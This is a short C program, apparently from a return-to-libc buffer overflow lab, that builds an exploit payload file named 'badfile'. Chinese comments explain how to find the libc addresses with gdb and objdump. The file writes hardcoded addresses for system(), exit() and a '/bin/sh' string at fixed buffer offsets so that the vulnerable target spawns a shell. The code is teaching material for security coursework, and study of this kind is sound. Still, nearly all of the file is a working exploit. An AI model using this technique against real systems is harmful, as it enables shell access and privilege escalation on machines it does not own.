#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv)
{
  char buf[40];
  FILE *badfile;

  badfile = fopen("./badfile", "w");

// 这几个地址是libc库加载到程序空间的地址，可以使用gdb 的 p system 和 p exit 命令得到
// 前提是在使用run命令之后，因为考虑到动态链接库的延迟绑定策略

  *(long *) &buf[32] = 0xbffffe7b ;   //  "/bin/sh"
  /*这里为什么从下标24开始，原因可以使用objdump -d retlib 看出来*/
  *(long *) &buf[24] = 0xb7e5f430 ;   //  system()   
  *(long *) &buf[28] = 0xb7e52fb0 ;   //  exit()

  fwrite(buf, sizeof(buf), 1, badfile);
  fclose(badfile);
}